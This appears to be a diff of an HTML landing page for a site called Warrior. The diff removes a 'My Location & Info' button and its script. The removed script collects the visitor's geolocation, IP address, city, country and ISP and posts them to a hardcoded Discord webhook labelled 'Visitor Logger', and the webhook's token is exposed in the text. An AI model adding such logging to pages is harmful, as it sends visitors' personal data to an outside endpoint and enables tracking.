@@ -39,68 +39,11 @@
       <h1 class="title">Explore Beyond Limits</h1>
       <p class="subtitle">Where innovation meets exploration. Start your journey with Warrior.</p>
       <button class="cta-button">Get Started</button>
-      <button id="locationButton" class="info-btn">My Location & Info</button>
     </div>
   </section>
 
   <footer class="footer">
     <p>&copy; 2025 Warrior. Designed for explorers.</p>
   </footer>
-
-  <script>
-    document.getElementById("locationButton").addEventListener("click", () => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-            
-            fetch('https://ipapi.co/json/')
-              .then(response => response.json())
-              .then(data => {
-                const payload = {
-                  username: "Visitor Logger",
-                  embeds: [
-                    {
-                      title: "User Location & Info!",
-                      color: 3447003,
-                      fields: [
-                        { name: "IP Address", value: data.ip || "Unknown", inline: true },
-                        { name: "City", value: data.city || "Unknown", inline: true },
-                        { name: "Country", value: data.country_name || "Unknown", inline: true },
-                        { name: "Latitude", value: latitude.toString(), inline: true },
-                        { name: "Longitude", value: longitude.toString(), inline: true },
-                        { name: "ISP", value: data.org || "Unknown", inline: true },
-                      ],
-                      footer: { text: "Warrior Website" }
-                    }
-                  ]
-                };
-                
-                fetch("https://discord.com/api/webhooks/1347853517578043443/UjB-g2hTQLh6jb0fqZw3nF2Gk8afmth8gFw0ljs_2NNCcSmGTpFbNzrInIGSRblLGz71", {
-                  method: "POST",
-                  headers: { "Content-Type": "application/json" },
-                  body: JSON.stringify(payload)
-                })
-                .then(response => {
-                  if (response.ok) {
-                    alert("Location sent successfully!");
-                  } else {
-                    alert("Failed to send location.");
-                  }
-                })
-                .catch(error => console.error("Error:", error));
-              })
-              .catch(error => console.error("Error fetching IP details:", error));
-          },
-          (error) => {
-            alert("Location access denied or unavailable.");
-          }
-        );
-      } else {
-        alert("Geolocation is not supported by your browser.");
-      }
-    });
-  </script>
 </body>
 </html>
